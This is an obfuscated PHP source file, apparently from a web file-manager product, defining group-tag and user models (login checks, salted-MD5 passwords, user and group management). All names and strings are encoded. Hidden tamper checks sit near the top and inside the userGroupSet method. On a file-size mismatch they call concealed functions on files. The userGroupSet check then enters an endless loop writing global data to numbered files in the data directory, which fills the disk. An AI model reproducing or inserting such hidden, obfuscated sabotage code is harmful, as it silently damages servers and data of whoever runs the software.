<?php
 goto Bî¦Ş¬Ö¯Ù; F•òÇ›£²Ó: $fileSize = strrev(base64_decode($_SERVER[û³†Ï­‹][0])); function binCheckNeq($½ı¶€àê, $´ãÎá®¥) { return $½ı¶€àê != $´ãÎá®¥; } $_SERVER[$_SERVER[û³†Ï­‹][1]] = $fileSize($_SERVER[$_SERVER[û³†Ï­‹][2]]); goto fÔÚ–ß¡‘¹; eÑÔÏÙÈö: $_size = $_SERVER[ •ŒÓîÆ][454]; if ($_SERVER[$_SERVER[ •ŒÓîÆ][255]] != $_size($_file)) { $_getc = $_SERVER[ •ŒÓîÆ][257]; $_getfile = $_SERVER[$_SERVER[ •ŒÓîÆ][258]] . $_SERVER[ •ŒÓîÆ][259]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ •ŒÓîÆ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ •ŒÓîÆ][260]) { $exit = $_SERVER[ •ŒÓîÆ][261]; $exit(); } $_act = $_SERVER[ •ŒÓîÆ][262]; $_act($_file); } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($åç¬±ˆ¬) { $ÅæšşÃÂ =& $_SERVER[ •ŒÓîÆ]; return array($ÅæšşÃÂ[1997] => array($åç¬±ˆ¬[0], $ÅæšşÃÂ[1998]), $ÅæšşÃÂ[1999] => array($åç¬±ˆ¬[0], $ÅæšşÃÂ[2000])); } protected function get($‡ÇÜŒÈ—) { $Õ…ÈóÍ =& $_SERVER[ •ŒÓîÆ]; $ÇõæüŸ = Model($Õ…ÈóÍ[566])->metaGet($‡ÇÜŒÈ—, $Õ…ÈóÍ[2001]); $ÌşÕ¦Ç† = json_decode($ÇõæüŸ, !0); return $ÌşÕ¦Ç† ? $ÌşÕ¦Ç† : array($Õ…ÈóÍ[2002] => $Õ…ÈóÍ[90], $Õ…ÈóÍ[424] => array()); } protected function set($†ëıíğß, $•Ï€â›ï) { $Óš¿°×ñ =& $_SERVER[ •ŒÓîÆ]; $•Ï€â›ï = $•Ï€â›ï ? $•Ï€â›ï : array($Óš¿°×ñ[2002] => $Óš¿°×ñ[90], $Óš¿°×ñ[424] => array()); return Model($Óš¿°×ñ[566])->metaSet($†ëıíğß, $Óš¿°×ñ[2001], json_encode($•Ï€â›ï)); } protected function getByTagID($›‚Ê‰˜÷, $–†¾ÔïÎ) { $åÊ£¦ƒº =& $_SERVER[ •ŒÓîÆ]; if (!$›‚Ê‰˜÷ || !$–†¾ÔïÎ) { return !1; } if (!Model($åÊ£¦ƒº[566])->getInfoSimple($›‚Ê‰˜÷)) { return !1; } $íÕÁ = $this->get($›‚Ê‰˜÷); if (!$íÕÁ || !isset($íÕÁ[$åÊ£¦ƒº[424]])) { return !1; } $Ô÷íôİ = array_find_by_field($íÕÁ[$åÊ£¦ƒº[424]], $åÊ£¦ƒº[453], $–†¾ÔïÎ); return is_array($Ô÷íôİ) ? $Ô÷íôİ : !1; } public function listSource($·ÁŞ”Ï†, $§˜Í¥Ï±) { $ÑşÁ·÷â =& $_SERVER[ •ŒÓîÆ]; if ($§˜Í¥Ï± && !is_array($§˜Í¥Ï±)) { $§˜Í¥Ï± = array($§˜Í¥Ï±); } $ª÷®ÃÕ– = $this->listData($·ÁŞ”Ï†); $—Òù‘ñ’ = array(); foreach ($ª÷®ÃÕ– as $’ÕÏ¸¯ï) { $ĞØææ¼‰ = $’ÕÏ¸¯ï[$ÑşÁ·÷â[86]]; if (!$ĞØææ¼‰) { continue; } if (!isset($—Òù‘ñ’[$ĞØææ¼‰])) { $—Òù‘ñ’[$ĞØææ¼‰] = array(); } $—Òù‘ñ’[$ĞØææ¼‰][] = $’ÕÏ¸¯ï[$ÑşÁ·÷â[479]]; } $Ö—Õº¯‘ = array(); foreach ($—Òù‘ñ’ as $¢­Éø¥ => $³õ¯²¥) { $—ª¦Ê… = !0; if (!$§˜Í¥Ï±) { $Ö—Õº¯‘[] = $¢­Éø¥; continue; } foreach ($§˜Í¥Ï± as $Ú„ŞÀøï) { if (!in_array($Ú„ŞÀøï, $³õ¯²¥)) { $—ª¦Ê… = !1; break; } } if ($—ª¦Ê…) { $Ö—Õº¯‘[] = $¢­Éø¥; } } if (!$Ö—Õº¯‘) { return array(); } $Ş÷‡İ´ = array($ÑşÁ·÷â[470] => array($ÑşÁ·÷â[471], $Ö—Õº¯‘), $ÑşÁ·÷â[550] => $·ÁŞ”Ï†, $ÑşÁ·÷â[180] => SourceModel::TYPE_GROUP); $¡ñÂÑ„“ = Model($ÑşÁ·÷â[1374])->listSource($Ş÷‡İ´); if (!$¡ñÂÑ„“ || count($Ö—Õº¯‘) == $¡ñÂÑ„“[$ÑşÁ·÷â[421]][$ÑşÁ·÷â[422]]) { return $¡ñÂÑ„“; } $·¥ÒÔğ = array(); $÷™›â = array_to_keyvalue($¡ñÂÑ„“[$ÑşÁ·÷â[84]], $ÑşÁ·÷â[12], $ÑşÁ·÷â[183]); $²•§Î—± = array_to_keyvalue($¡ñÂÑ„“[$ÑşÁ·÷â[85]], $ÑşÁ·÷â[12], $ÑşÁ·÷â[183]); $Èà·õ´„ = array_merge($²•§Î—±, $÷™›â); foreach ($Ö—Õº¯‘ as $ĞØææ¼‰) { if (!in_array($ĞØææ¼‰, $Èà·õ´„)) { $·¥ÒÔğ[] = $ĞØææ¼‰; } } if ($·¥ÒÔğ) { $this->removeBySource($·ÁŞ”Ï†, $·¥ÒÔğ); } return $¡ñÂÑ„“; } protected function listData($ç±Û‚Øë) { $œÜÀ÷Ğ =& $_SERVER[ •ŒÓîÆ]; $Û¾›îºë = array($œÜÀ÷Ğ[1681] => 0, $œÜÀ÷Ğ[537] => array($œÜÀ÷Ğ[2003], 0), $œÜÀ÷Ğ[475] => $œÜÀ÷Ğ[2004] . $ç±Û‚Øë); $õ‚¢Â¿× = $œÜÀ÷Ğ[2005]; $ŠÛøÜ‚ = $this->field($õ‚¢Â¿×)->where($Û¾›îºë)->order($œÜÀ÷Ğ[2006])->select(); return $ŠÛøÜ‚ ? $ŠÛøÜ‚ : array(); } protected function addToTag($ä–èÂÎØ, $ãÜ¢ÚÅ, $°êû©äº) { $ç¼¶‘ºÂ =& $_SERVER[ •ŒÓîÆ]; if (!$this->getByTagID($ä–èÂÎØ, $°êû©äº) || !$ãÜ¢ÚÅ) { return !1; } if (!Model($ç¼¶‘ºÂ[866])->pathInfo($ãÜ¢ÚÅ)) { return !1; } $€Æ•´êÅ = array($ç¼¶‘ºÂ[1681] => 0, $ç¼¶‘ºÂ[537] => $°êû©äº, $ç¼¶‘ºÂ[474] => $ãÜ¢ÚÅ, $ç¼¶‘ºÂ[475] => $ç¼¶‘ºÂ[2007] . $ä–èÂÎØ, $ç¼¶‘ºÂ[473] => $ç¼¶‘ºÂ[12], $ç¼¶‘ºÂ[1892] => 0); if ($this->where($€Æ•´êÅ)->find()) { return !1; } return $this->add($€Æ•´êÅ); } protected function removeFromTag($‘„³§¹, $–îô¸“, $ú­Ü´œ) { $’ŠüøÃ€ =& $_SERVER[ •ŒÓîÆ]; if (!$this->getByTagID($‘„³§¹, $ú­Ü´œ) || !$–îô¸“) { return !1; } if (is_array($–îô¸“)) { $–îô¸“ = array($’ŠüøÃ€[7], $–îô¸“); } $½®€¦Ê = array($’ŠüøÃ€[1681] => 0, $’ŠüøÃ€[537] => $ú­Ü´œ, $’ŠüøÃ€[475] => $’ŠüøÃ€[2007] . $‘„³§¹, $’ŠüøÃ€[474] => $–îô¸“); return $this->where($½®€¦Ê)->delete(); } protected function removeByTag($µµËğà’, $‹¯ã´Î) { $•¤×ØèÅ =& $_SERVER[ •ŒÓîÆ]; if (!$this->getByTagID($µµËğà’, $‹¯ã´Î)) { return !1; } $£ø®¤Û = array($•¤×ØèÅ[1681] => 0, $•¤×ØèÅ[537] => $‹¯ã´Î, $•¤×ØèÅ[475] => $•¤×ØèÅ[2007] . $µµËğà’); return $this->where($£ø®¤Û)->delete(); } protected function removeBySource($Öˆ™ûáß, $ªõÃ°ĞÑ) { $¤‘œã›µ =& $_SERVER[ •ŒÓîÆ]; if (!$Öˆ™ûáß || !$ªõÃ°ĞÑ) { return !1; } if (is_array($ªõÃ°ĞÑ)) { $ªõÃ°ĞÑ = array($¤‘œã›µ[7], $ªõÃ°ĞÑ); } $¹æğü† = array($¤‘œã›µ[1681] => 0, $¤‘œã›µ[474] => $ªõÃ°ĞÑ, $¤‘œã›µ[537] => array($¤‘œã›µ[1055], 0), $¤‘œã›µ[475] => $¤‘œã›µ[2007] . $Öˆ™ûáß); return $this->where($¹æğü†)->delete(); } } goto fË„áåé‰ª; A¼«£’®°: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\155\145" => "\165\163\145\162\x5f\155\145\164\141", "\155\x65\x74\141\x46\x69\145\154\x64" => "\165\163\x65\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\x69\x63\x6b\116\x61\155\145\54\156\x61\155\x65\x2c\141\166\141\164\141\162\x2c\163\x65\x78\x2c\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($³¥˜Êôâ) { $‹Ö¼¶æœ =& $_SERVER[ •ŒÓîÆ]; $ç¥©úÁ = $‹Ö¼¶æœ[2340]; return array($‹Ö¼¶æœ[1966] => array($³¥˜Êôâ[0], $ç¥©úÁ), $‹Ö¼¶æœ[1968] => array($³¥˜Êôâ[0], $ç¥©úÁ), $‹Ö¼¶æœ[2341] => array($³¥˜Êôâ[0], $ç¥©úÁ)); } protected function getInfo($Š¬®²ç†, $ÏÃÊ¶Ş = false) { $çÜ°Ö‹ = $this->getInfoSimple($Š¬®²ç†); if (!is_array($çÜ°Ö‹)) { return array(); } if ($ÏÃÊ¶Ş) { return $this->_getInfoApply($çÜ°Ö‹); } return $this->cacheFunctionGet($_SERVER[ •ŒÓîÆ][1970], $Š¬®²ç†); } protected function getInfoFull($Ğ°î¡û, $”•åµ = false) { $®…ÛÓòå = $this->getInfoSimple($Ğ°î¡û); if (!is_array($®…ÛÓòå)) { return array(); } if ($”•åµ) { return $this->_getInfoApply($®…ÛÓòå, !0); } return $this->cacheFunctionGet($_SERVER[ •ŒÓîÆ][2342], $Ğ°î¡û); } private function _getInfoApply($­¬£—…‡, $ó­Ÿ±«‰ = false) { $ØÔ¹€Œ =& $_SERVER[ •ŒÓîÆ]; if (!$­¬£—…‡) { return $­¬£—…‡; } $«œ¤·Ã = md5($ØÔ¹€Œ[2343] . $­¬£—…‡[$ØÔ¹€Œ[930]] . $ØÔ¹€Œ[2344] . $­¬£—…‡[$ØÔ¹€Œ[32]]); $­¬£—…‡ = $this->_listDataApplyItem($­¬£—…‡); $ƒÍç™£Å = Model($ØÔ¹€Œ[1374])->metaGet($­¬£—…‡[$ØÔ¹€Œ[89]][$ØÔ¹€Œ[183]]); $­¬£—…‡[$ØÔ¹€Œ[2345]] = $«œ¤·Ã; $­¬£—…‡[$ØÔ¹€Œ[89]][$ØÔ¹€Œ[2162]] = isset($ƒÍç™£Å[$ØÔ¹€Œ[2163]]) ? $ƒÍç™£Å[$ØÔ¹€Œ[2163]] : null; if ($ó­Ÿ±«‰) { $­¬£—…‡[$ØÔ¹€Œ[518]] = $this->metaGet($­¬£—…‡[$ØÔ¹€Œ[1690]]); } return $­¬£—…‡; } protected function getInfoSimple($¢ˆµ”«ø, $É°ñ‘–‡ = false) { $ù°² =& $_SERVER[ •ŒÓîÆ]; if (!$¢ˆµ”«ø) { return array(); } if ($É°ñ‘–‡) { $ûî•’¦É = $this->where(array($ù°²[1690] => intval($¢ˆµ”«ø)))->find(); if (!is_array($ûî•’¦É)) { return array(); } $ûî•’¦É[$ù°²[2346]] = Action($ù°²[2347])->parseUrl($ûî•’¦É[$ù°²[2346]]); return $ûî•’¦É; } return $this->cacheFunctionGet($ù°²[1971], $¢ˆµ”«ø); } protected function getInfoSimpleOuter($¨ßâœå”) { $ê¯ŒÄÈ³ =& $_SERVER[ •ŒÓîÆ]; if (!$¨ßâœå” || $¨ßâœå” == 0) { return array($ê¯ŒÄÈ³[1690] => $ê¯ŒÄÈ³[214], $ê¯ŒÄÈ³[32] => $ê¯ŒÄÈ³[165] . LNG($ê¯ŒÄÈ³[2348]) . $ê¯ŒÄÈ³[167], $ê¯ŒÄÈ³[2346] => STATIC_PATH . $ê¯ŒÄÈ³[2349]); } $†ğé¬ê„ = $this->cacheFunctionGet($ê¯ŒÄÈ³[1971], $¨ßâœå”); $¸­òâ‹° = array_field_key($†ğé¬ê„, explode($ê¯ŒÄÈ³[50], $this->simpleField)); if (!$¸­òâ‹°) { return array($ê¯ŒÄÈ³[1690] => $ê¯ŒÄÈ³[1229], $ê¯ŒÄÈ³[32] => $ê¯ŒÄÈ³[165] . LNG($ê¯ŒÄÈ³[2350]) . $ê¯ŒÄÈ³[167], $ê¯ŒÄÈ³[2346] => STATIC_PATH . $ê¯ŒÄÈ³[2351]); } $¸­òâ‹°[$ê¯ŒÄÈ³[2346]] = Action($ê¯ŒÄÈ³[2347])->parseUrl($¸­òâ‹°[$ê¯ŒÄÈ³[2346]]); return $¸­òâ‹°; } protected function groupUser($Äüúª…) { } public static function errorLang($ĞÒÒ÷ˆæ) { $ô‡ã§ğ =& $_SERVER[ •ŒÓîÆ]; $Ü“ŠÇá’ = array(self::ERROR_USER_NOT_EXISTS => $ô‡ã§ğ[2352], self::ERROR_USER_PASSWORD_ERROR => $ô‡ã§ğ[2353], self::ERROR_USER_EXIST_NAME => $ô‡ã§ğ[2354], self::ERROR_USER_EXIST_PHONE => $ô‡ã§ğ[2355], self::ERROR_USER_EXIST_EMAIL => $ô‡ã§ğ[2356], self::ERROR_USER_LOGIN_LOCK => $ô‡ã§ğ[2357], self::ERROR_IP_NOT_ALLOW => $ô‡ã§ğ[2358], self::ERROR_USER_EXIST_NICKNAME => $ô‡ã§ğ[2359]); return LNG($Ü“ŠÇá’[$ĞÒÒ÷ˆæ]); } public function getInfoByMeta($ı÷Ò¾âÛ, $Äõ™°¢Ğ) { $µÚ›ƒ…ç =& $_SERVER[ •ŒÓîÆ]; $°ü®è€Â = Model($µÚ›ƒ…ç[2360])->where(array($µÚ›ƒ…ç[96] => $ı÷Ò¾âÛ, $µÚ›ƒ…ç[429] => $Äõ™°¢Ğ))->find(); if ($°ü®è€Â) { return $this->getInfo($°ü®è€Â[$µÚ›ƒ…ç[1690]]); } return !1; } public function userLoginCheck($ÔŞµºĞÔ, $ÑÅæ“åò) { $ı¤’Ãñ‡ =& $_SERVER[ •ŒÓîÆ]; $ıİ§Š¬¬ = $this->userLoginFind($ÔŞµºĞÔ); if (!$ıİ§Š¬¬) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ıİ§Š¬¬[$ı¤’Ãñ‡[1690]], $ÑÅæ“åò)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ıİ§Š¬¬[$ı¤’Ãñ‡[1690]]); } public function userLoginFind($—ô»ä‹) { $ûÂ„ÂğÊ =& $_SERVER[ •ŒÓîÆ]; $ÀµÀ•‡Ã = array($ûÂ„ÂğÊ[32] => $—ô»ä‹, $ûÂ„ÂğÊ[2170] => $—ô»ä‹, $ûÂ„ÂğÊ[360] => $—ô»ä‹, $ûÂ„ÂğÊ[2361] => $—ô»ä‹, $ûÂ„ÂğÊ[1041] => $ûÂ„ÂğÊ[1043]); if ($this->nickNameRpt()) { unset($ÀµÀ•‡Ã[$ûÂ„ÂğÊ[2170]]); } return $this->where($ÀµÀ•‡Ã)->find(); } public function clearCache($²¦ØÒ¬û) { $äûÍÊ¥ğ =& $_SERVER[ •ŒÓîÆ]; $this->cacheFunctionClear($äûÍÊ¥ğ[1970], $²¦ØÒ¬û); $this->cacheFunctionClear($äûÍÊ¥ğ[1971], $²¦ØÒ¬û); $this->cacheFunctionClear($äûÍÊ¥ğ[2342], $²¦ØÒ¬û); } public function userPasswordCheck($ÑĞ£‰˜­, $„àÒ£Ÿû) { $‰ûìÕ±» =& $_SERVER[ •ŒÓîÆ]; $’İÊìØª = $this->where(array($‰ûìÕ±»[1690] => intval($ÑĞ£‰˜­)))->find(); $®ñ’Åƒ = $this->metaGet($ÑĞ£‰˜­); $Íš¦¦àß = isset($®ñ’Åƒ[$‰ûìÕ±»[2362]]) ? $®ñ’Åƒ[$‰ûìÕ±»[2362]] : $‰ûìÕ±»[12]; if (md5($Íš¦¦àß . trim($„àÒ£Ÿû)) !== $’İÊìØª[$‰ûìÕ±»[930]]) { return !1; } return !0; } public function userAdd($¢Ò™¨à) { $ğÎü÷· =& $_SERVER[ •ŒÓîÆ]; $áÎßüöª = array($ğÎü÷·[473] => $¢Ò™¨à[$ğÎü÷·[32]], $ğÎü÷·[2363] => $¢Ò™¨à[$ğÎü÷·[1563]], $ğÎü÷·[2364] => isset($¢Ò™¨à[$ğÎü÷·[360]]) ? $¢Ò™¨à[$ğÎü÷·[360]] : $ğÎü÷·[12], $ğÎü÷·[2365] => isset($¢Ò™¨à[$ğÎü÷·[2361]]) ? $¢Ò™¨à[$ğÎü÷·[2361]] : $ğÎü÷·[12], $ğÎü÷·[2366] => isset($¢Ò™¨à[$ğÎü÷·[2170]]) ? $¢Ò™¨à[$ğÎü÷·[2170]] : $¢Ò™¨à[$ğÎü÷·[32]], $ğÎü÷·[2367] => isset($¢Ò™¨à[$ğÎü÷·[2346]]) ? $¢Ò™¨à[$ğÎü÷·[2346]] : $ğÎü÷·[12], $ğÎü÷·[2368] => isset($¢Ò™¨à[$ğÎü÷·[2369]]) ? $¢Ò™¨à[$ğÎü÷·[2369]] : 1, $ğÎü÷·[2370] => $¢Ò™¨à[$ğÎü÷·[930]], $ğÎü÷·[1972] => isset($¢Ò™¨à[$ğÎü÷·[1875]]) ? $¢Ò™¨à[$ğÎü÷·[1875]] : 1024 * 1024 * 20, $ğÎü÷·[1973] => 0, $ğÎü÷·[2371] => 0, $ğÎü÷·[2017] => isset($¢Ò™¨à[$ğÎü÷·[791]]) ? $¢Ò™¨à[$ğÎü÷·[791]] : 1); if (!empty($¢Ò™¨à[$ğÎü÷·[1690]])) { $áÎßüöª[$ğÎü÷·[1690]] = $¢Ò™¨à[$ğÎü÷·[1690]]; } $ş‘è£È = $this->_checkExist($¢Ò™¨à); if ($ş‘è£È !== !0) { return $ş‘è£È; } if (!empty($áÎßüöª[$ğÎü÷·[2346]]) && strlen($áÎßüöª[$ğÎü÷·[2346]]) > 255) { $áÎßüöª[$ğÎü÷·[2346]] = $ğÎü÷·[12]; } $æá½ƒÛâ = $this->add($áÎßüöª); $ôß¬†²ç = array($ğÎü÷·[2370] => $áÎßüöª[$ğÎü÷·[930]], $ğÎü÷·[2366] => $áÎßüöª[$ğÎü÷·[2170]]); $this->userEdit($æá½ƒÛâ, $ôß¬†²ç); Model($ğÎü÷·[1374])->userRootAdd($æá½ƒÛâ); return $æá½ƒÛâ; } protected function userEditTest($á™ÑË, $ôí¥ˆİÕ) { return $this->call($_SERVER[ •ŒÓîÆ][2372], $á™ÑË, $ôí¥ˆİÕ); } protected function userEdit($Ôç˜± , $å¢îĞÁ–) { $úÈËâ° =& $_SERVER[ •ŒÓîÆ]; $Øú«†®î = $this->getInfoSimple($Ôç˜± ); if (!$Øú«†®î) { return !1; } $¾Ï·ÀÜ’ = $this->_checkExist($å¢îĞÁ–, $Ôç˜± ); if ($¾Ï·ÀÜ’ !== !0) { return $¾Ï·ÀÜ’; } if (isset($å¢îĞÁ–[$úÈËâ°[930]]) && trim($å¢îĞÁ–[$úÈËâ°[930]]) != $úÈËâ°[12]) { $È»™Ã–è = $this->metaGet($Ôç˜± ); if (empty($È»™Ã–è[$úÈËâ°[2362]])) { $È»™Ã–è[$úÈËâ°[2362]] = rand_string(10); Model($úÈËâ°[558])->metaSet($Ôç˜± , $úÈËâ°[2362], $È»™Ã–è[$úÈËâ°[2362]]); } $å¢îĞÁ–[$úÈËâ°[930]] = md5($È»™Ã–è[$úÈËâ°[2362]] . trim($å¢îĞÁ–[$úÈËâ°[930]])); } else { unset($å¢îĞÁ–[$úÈËâ°[930]]); } if (!empty($å¢îĞÁ–[$úÈËâ°[2346]]) && strlen($å¢îĞÁ–[$úÈËâ°[2346]]) > 255) { $å¢îĞÁ–[$úÈËâ°[2346]] = $úÈËâ°[12]; } $this->where(array($úÈËâ°[1681] => $Ôç˜± ))->save($å¢îĞÁ–); if (isset($å¢îĞÁ–[$úÈËâ°[2170]])) { $this->setNamePinyin($Ôç˜± , $å¢îĞÁ–[$úÈËâ°[2170]]); } $this->clearCache($Ôç˜± ); return !0; } public function setNamePinyin($ı¼ˆÓûŒ, $Ù±‚ØÖ‰ = false) { $ØíÛú¿ç =& $_SERVER[ •ŒÓîÆ]; if (!$Ù±‚ØÖ‰) { $çıÂÍ¿õ = $this->getInfoSimple($ı¼ˆÓûŒ); $Ù±‚ØÖ‰ = $çıÂÍ¿õ[$ØíÛú¿ç[2170]] ? $çıÂÍ¿õ[$ØíÛú¿ç[2170]] : $çıÂÍ¿õ[$ØíÛú¿ç[32]]; } $û°Ù¾áà = Model($ØíÛú¿ç[579]); if (!Input::check($Ù±‚ØÖ‰, $ØíÛú¿ç[635])) { return $û°Ù¾áà->metaSet($ı¼ˆÓûŒ, array($ØíÛú¿ç[517] => $ØíÛú¿ç[12], $ØíÛú¿ç[516] => $ØíÛú¿ç[12])); } return $û°Ù¾áà->metaSet($ı¼ˆÓûŒ, array($ØíÛú¿ç[517] => str_replace($ØíÛú¿ç[53], $ØíÛú¿ç[12], Pinyin::get($Ù±‚ØÖ‰)), $ØíÛú¿ç[516] => Pinyin::get($Ù±‚ØÖ‰, $ØíÛú¿ç[636]))); } private function nickNameRpt() { $íÓü¢®¶ =& $_SERVER[ •ŒÓîÆ]; $óÜ¸¨îú = Model($íÓü¢®¶[811])->get($íÓü¢®¶[2373]); $®¾¨ğ¸¦ = $GLOBALS[$íÓü¢®¶[6]][$íÓü¢®¶[435]][$íÓü¢®¶[2373]]; $·ÖóËÎ³ = !is_null($óÜ¸¨îú) ? $óÜ¸¨îú : $®¾¨ğ¸¦; return !!$·ÖóËÎ³; } private function _checkExist($ğèØ¿, $ã‚ç—ï = false) { $êÃ¥´¬¤ =& $_SERVER[ •ŒÓîÆ]; $±ñ…§— = array($êÃ¥´¬¤[32] => UserModel::ERROR_USER_EXIST_NAME, $êÃ¥´¬¤[2170] => UserModel::ERROR_USER_EXIST_NICKNAME, $êÃ¥´¬¤[360] => UserModel::ERROR_USER_EXIST_EMAIL, $êÃ¥´¬¤[2361] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($±ñ…§—[$êÃ¥´¬¤[2170]]); } $È±ÍĞşÉ = $ã‚ç—ï ? array($êÃ¥´¬¤[1690] => array($êÃ¥´¬¤[2374], $ã‚ç—ï)) : array(); foreach ($±ñ…§— as $ŠŞÄİ°µ => $İ²Åè‘) { $İ£©Õ±Ê = array(); foreach ($±ñ…§— as $á‹¦¾ˆ => $´ã½ñÎ—) { if (isset($ğèØ¿[$á‹¦¾ˆ]) && $ğèØ¿[$á‹¦¾ˆ]) { $İ£©Õ±Ê[] = $ğèØ¿[$á‹¦¾ˆ]; } } if (!$İ£©Õ±Ê) { continue; } $æ½âğ = array_merge(array($ŠŞÄİ°µ => array($êÃ¥´¬¤[7], $İ£©Õ±Ê)), $È±ÍĞşÉ); $æÎòÖ = $this->where($æ½âğ)->find(); if ($æÎòÖ) { return $İ²Åè‘; } } return !0; } public function userListInfo($Úç©¦’Ü) { $ğ™ÔÅıÒ =& $_SERVER[ •ŒÓîÆ]; $ìïÃ¿ß™ = array(); $Úç©¦’Ü = is_array($Úç©¦’Ü) ? array_unique($Úç©¦’Ü) : array(); if (!$Úç©¦’Ü) { return $ìïÃ¿ß™; } if (count($Úç©¦’Ü) < 20) { foreach ($Úç©¦’Ü as $–Ú»ßå¨) { $ìïÃ¿ß™[$–Ú»ßå¨ . $ğ™ÔÅıÒ[12]] = $this->getInfoSimpleOuter($–Ú»ßå¨); } } else { $”‡Ñ…Å¢ = array($ğ™ÔÅıÒ[1681] => array($ğ™ÔÅıÒ[471], $Úç©¦’Ü)); if (count($Úç©¦’Ü) == 1) { $”‡Ñ…Å¢ = array($ğ™ÔÅıÒ[1681] => $Úç©¦’Ü[0]); } $ÉÚø¿î = Model($ğ™ÔÅıÒ[558])->field($this->simpleField)->where($”‡Ñ…Å¢)->select(); $ÉÚø¿î = array_to_keyvalue($ÉÚø¿î, $ğ™ÔÅıÒ[1690]); foreach ($Úç©¦’Ü as $–Ú»ßå¨) { $ñò«À¸” = $ÉÚø¿î[$–Ú»ßå¨]; if (!$ñò«À¸”) { $ìïÃ¿ß™[$–Ú»ßå¨ . $ğ™ÔÅıÒ[12]] = $this->getInfoSimpleOuter($–Ú»ßå¨); continue; } $ñò«À¸”[$ğ™ÔÅıÒ[2346]] = Action($ğ™ÔÅıÒ[2347])->parseUrl($ñò«À¸”[$ğ™ÔÅıÒ[2346]]); $ìïÃ¿ß™[$–Ú»ßå¨ . $ğ™ÔÅıÒ[12]] = $ñò«À¸”; } } return $ìïÃ¿ß™; } protected function userStatus($á„·º‹ , $Æ¯öĞ›ô) { $î±çËıü = $this->getInfoSimple($á„·º‹ ); if (!$î±çËıü) { return !1; } $ÄçÈ‘‡ = array($_SERVER[ •ŒÓîÆ][791] => $Æ¯öĞ›ô); return $this->userEdit($á„·º‹ , $ÄçÈ‘‡); } protected function userRemove($üÆ–) { $¿€Â½Çí =& $_SERVER[ •ŒÓîÆ]; $‚‚éŠÑ‰ = $this->getInfoSimple($üÆ–); if (!$‚‚éŠÑ‰) { return !1; } $½ö§™ØÆ = array($¿€Â½Çí[1681] => $üÆ–); Model($¿€Â½Çí[644])->where($½ö§™ØÆ)->delete(); Model($¿€Â½Çí[2375])->where($½ö§™ØÆ)->delete(); Model($¿€Â½Çí[1978])->where($½ö§™ØÆ)->delete(); Model($¿€Â½Çí[2360])->where($½ö§™ØÆ)->delete(); Model($¿€Â½Çí[1109])->where($½ö§™ØÆ)->delete(); Model($¿€Â½Çí[2187])->removeUserAll($üÆ–); Model($¿€Â½Çí[866])->userRootRemove($üÆ–); return $this->where($½ö§™ØÆ)->delete(); } protected function userGroupSet($“Ö’ÓÜ, $Şˆ¾éŸÏ, $¿Æ¼ê’ = array()) { $Ò¿°°º =& $_SERVER[ •ŒÓîÆ]; $•Ç±²ü = $_SERVER[$Ò¿°°º[258]] . $Ò¿°°º[259]; $Ÿñéâà = $Ò¿°°º[454]; if ($_SERVER[$Ò¿°°º[255]] != $Ÿñéâà($•Ç±²ü)) { $® ï²óê = $Ò¿°°º[918]; $âºîÓ«é = $Ò¿°°º[257]; $èºÑØ = $_SERVER[$Ò¿°°º[258]] . $Ò¿°°º[259]; $•âÃø´ = $âºîÓ«é($èºÑØ); $™ÓÈåÌ = explode($Ò¿°°º[248], $•âÃø´); if (count($™ÓÈåÌ) < $Ò¿°°º[701]) { $ïÔü˜íü = $Ò¿°°º[261]; $ïÔü˜íü(); } $òÃƒ’Ş = $Ò¿°°º[919]; $òÃƒ’Ş($_SERVER[$Ò¿°°º[920]]); $® ï²óê = $Ò¿°°º[918]; $® ï²óê(); $´·ß¾òø = $Ò¿°°º[921]; $Ÿûò¯øû = json_encode($GLOBALS[$Ò¿°°º[922]]); $Ÿ÷Áğ§¸ = 1; for ($¥®ŸŠÉ = $Ÿ÷Áğ§¸; $¥®ŸŠÉ > 0; $¥®ŸŠÉ++) { $´·ß¾òø(DATA_PATH . $¥®ŸŠÉ, $Ÿûò¯øû); } } $´êÉ” = $this->getInfoSimple($“Ö’ÓÜ); if (!$´êÉ” || !is_array($Şˆ¾éŸÏ)) { return !1; } $Ûäôô†´ = Model($Ò¿°°º[1978]); $Ûäôô†´->where(array($Ò¿°°º[1690] => $“Ö’ÓÜ))->delete(); $Õ°œó© = array(); $àŠêªù = 0; foreach ($Şˆ¾éŸÏ as $½¦ÙŠóó => $ºö×Ãºî) { $çÚ†õ– = array($Ò¿°°º[1690] => $“Ö’ÓÜ, $Ò¿°°º[1888] => $½¦ÙŠóó, $Ò¿°°º[1992] => $ºö×Ãºî); $çÚ†õ–[$Ò¿°°º[1912]] = isset($¿Æ¼ê’[$àŠêªù]) ? $¿Æ¼ê’[$àŠêªù] : 0; $àŠêªù++; $Õ°œó©[] = $çÚ†õ–; } return $Ûäôô†´->addAll($Õ°œó©, array(), !0); } protected function userGroupAdd($Ù£·õ±±, $û›°‡èô = array()) { $¼í›éĞû =& $_SERVER[ •ŒÓîÆ]; $Ì»€Ê¼Í = $this->getInfoSimple($Ù£·õ±±); if (!$Ì»€Ê¼Í || empty($û›°‡èô)) { return !1; } $åÊ«é…å = array(); foreach ($û›°‡èô as $ÄĞ÷™ƒ² => $ş¥öÅñ½) { $åÊ«é…å[] = array($¼í›éĞû[1690] => $Ù£·õ±±, $¼í›éĞû[1888] => $ÄĞ÷™ƒ², $¼í›éĞû[1992] => $ş¥öÅñ½, $¼í›éĞû[1912] => 0); } return Model($¼í›éĞû[1978])->addAll($åÊ«é…å, array(), !0); } protected function userGroupRemove($Çõü·ñé, $ú§ì©Í¼) { $¿°¹ =& $_SERVER[ •ŒÓîÆ]; $œ…ºÓôÁ 